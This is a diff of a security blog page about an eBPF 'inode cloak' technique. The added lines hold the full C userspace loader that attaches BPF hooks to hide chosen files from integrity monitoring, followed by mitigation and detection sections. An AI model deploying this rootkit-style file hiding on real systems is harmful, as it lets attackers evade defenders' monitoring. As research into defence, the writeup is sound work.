+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/libbpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;bpf/bpf.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">"inode_cloak.skel.h"</span><span class="cp">
+</span>
+<span class="k">static</span> <span class="k">volatile</span> <span class="n">bool</span> <span class="n">exiting</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
 
-<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security monitoring systems, especially in environments where file integrity monitoring is a key security control.</p>
+<span class="c1">// Structure for file events (must match the BPF version)</span>
+<span class="k">struct</span> <span class="n">file_event</span> <span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="kt">uint64_t</span> <span class="n">timestamp</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">path</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="kt">uint32_t</span> <span class="n">operation</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="n">hidden</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="c1">// Handle events from the eBPF program</span>
+<span class="kt">void</span> <span class="nf">handle_event</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">data_sz</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">file_event</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">data</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">timestamp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+    <span class="kt">time_t</span> <span class="n">t</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">timestamp</span> <span class="o">/</span> <span class="mi">1000000000</span><span class="p">;</span>
+    <span class="n">strftime</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">timestamp</span><span class="p">),</span> <span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">,</span> <span class="n">localtime</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="p">));</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[%s] Process %d (%s) "</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">);</span>
+    
+    <span class="k">switch</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">operation</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"attempted to open"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"attempted to stat"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"attempted to list"</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="nl">default:</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"accessed"</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">" file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">);</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">hidden</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  Result: HIDDEN (file access prevented)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"  Result: Allowed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="p">}</span>
+    
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Add a file pattern to hide</span>
+<span class="kt">void</span> <span class="nf">add_hidden_file</span><span class="p">(</span><span class="kt">int</span> <span class="n">map_fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pattern</span><span class="p">,</span> <span class="kt">int</span> <span class="n">index</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">key</span> <span class="o">=</span> <span class="n">index</span><span class="p">;</span>
+    
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_map_update_elem</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">BPF_ANY</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to add hidden file pattern: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Added hidden file pattern: %s (index %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">sig_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">exiting</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">inode_cloak_bpf</span> <span class="o">*</span><span class="n">skel</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">perf_buffer</span> <span class="o">*</span><span class="n">pb</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="c1">// Set up signal handler</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+    <span class="n">signal</span><span class="p">(</span><span class="n">SIGTERM</span><span class="p">,</span> <span class="n">sig_handler</span><span class="p">);</span>
+
+    <span class="c1">// Increase resource limits</span>
+    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="n">RLIM_INFINITY</span>
+    <span class="p">};</span>
+    <span class="n">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>
+
+    <span class="c1">// Load and verify BPF program</span>
+    <span class="n">skel</span> <span class="o">=</span> <span class="n">inode_cloak_bpf__open_and_load</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">skel</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to open and load BPF skeleton</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Attach BPF programs</span>
+    <span class="n">err</span> <span class="o">=</span> <span class="n">inode_cloak_bpf__attach</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to attach BPF skeleton: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Set up perf buffer for events</span>
+    <span class="n">pb</span> <span class="o">=</span> <span class="n">perf_buffer__new</span><span class="p">(</span><span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">events</span><span class="p">),</span> <span class="mi">64</span><span class="p">,</span> <span class="n">handle_event</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pb</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to create perf buffer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Add custom hidden file patterns if provided as arguments</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">map_fd</span> <span class="o">=</span> <span class="n">bpf_map__fd</span><span class="p">(</span><span class="n">skel</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">.</span><span class="n">hidden_files</span><span class="p">);</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">add_hidden_file</span><span class="p">(</span><span class="n">map_fd</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Inode Cloak eBPF program loaded and running.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Hiding files from detection systems...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Press Ctrl+C to exit.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="c1">// Main loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">exiting</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span> <span class="o">=</span> <span class="n">perf_buffer__poll</span><span class="p">(</span><span class="n">pb</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="o">-</span><span class="n">EINTR</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Error polling perf buffer: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
+            <span class="k">goto</span> <span class="n">cleanup</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nl">cleanup:</span>
+    <span class="n">perf_buffer__free</span><span class="p">(</span><span class="n">pb</span><span class="p">);</span>
+    <span class="n">inode_cloak_bpf__destroy</span><span class="p">(</span><span class="n">skel</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="o">-</span><span class="n">err</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="mitigation-strategies">Mitigation Strategies</h3>
+
+<ol>
+  <li><strong>Restrict eBPF Capabilities</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c"># Remove CAP_BPF from container</span>
+docker run <span class="nt">--cap-drop</span><span class="o">=</span>bpf <span class="nt">--security-opt</span> no-new-privileges ...
+   
+<span class="c"># In Kubernetes</span>
+securityContext:
+  capabilities:
+    drop:
+      - BPF
+      - SYS_ADMIN
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement BPF LSM Policies</strong>:
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c1">// Example BPF LSM policy to restrict BPF program loading</span>
+<span class="n">SEC</span><span class="p">(</span><span class="s">"lsm/bpf"</span><span class="p">)</span>
+<span class="kt">int</span> <span class="nf">BPF_PROG</span><span class="p">(</span><span class="n">restrict_bpf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="k">union</span> <span class="n">bpf_attr</span> <span class="o">*</span><span class="n">attr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Only allow specific signing keys or programs from trusted paths</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_get_current_uid_gid</span><span class="p">()</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Use Multiple File Integrity Monitoring Methods</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="c"># Use different methods to list files</span>
+find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*"</span> <span class="o">&gt;</span> find_files.txt
+<span class="nb">ls</span> <span class="nt">-laR</span> / <span class="o">&gt;</span> ls_files.txt
+   
+<span class="c"># Compare results</span>
+diff &lt;<span class="o">(</span><span class="nb">sort </span>find_files.txt<span class="o">)</span> &lt;<span class="o">(</span><span class="nb">sort </span>ls_files.txt<span class="o">)</span>
+   
+<span class="c"># Use direct disk access methods</span>
+debugfs <span class="nt">-R</span> <span class="s2">"ls -l /"</span> /dev/sda1
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li><strong>Implement Kernel-Level Integrity Verification</strong>:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="c"># Use IMA/EVM for file integrity</span>
+<span class="nb">echo</span> <span class="s2">"1"</span> <span class="o">&gt;</span> /sys/kernel/security/ima/policy
+   
+<span class="c"># Configure auditd to monitor filesystem operations</span>
+auditctl <span class="nt">-w</span> /etc/passwd <span class="nt">-p</span> rwxa <span class="nt">-k</span> passwd_changes
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ol>
 
 <h3 id="real-world-impact">Real-world Impact</h3>
 
@@ -710,6 +1586,19 @@
 </ul>
 
 <p>The ability to selectively hide files from detection systems while maintaining full functionality creates a particularly dangerous scenario where malicious activity can persist undetected for extended periods.</p>
+
+<h3 id="detection-methods">Detection Methods</h3>
+
+<p>Defenders should monitor for:</p>
+<ul>
+  <li>Unexpected eBPF programs attached to filesystem-related functions</li>
+  <li>Discrepancies between different methods of listing files</li>
+  <li>Files visible to some processes but not others</li>
+  <li>Unusual patterns of filesystem hook installations</li>
+  <li>Inconsistencies between filesystem state and monitoring tool reports</li>
+</ul>
+
+<p>This technique demonstrates why proper eBPF restrictions are critical for maintaining the integrity of security monitoring systems, especially in environments where file integrity monitoring is a key security control.</p>
 
                     </div>
                 </article>
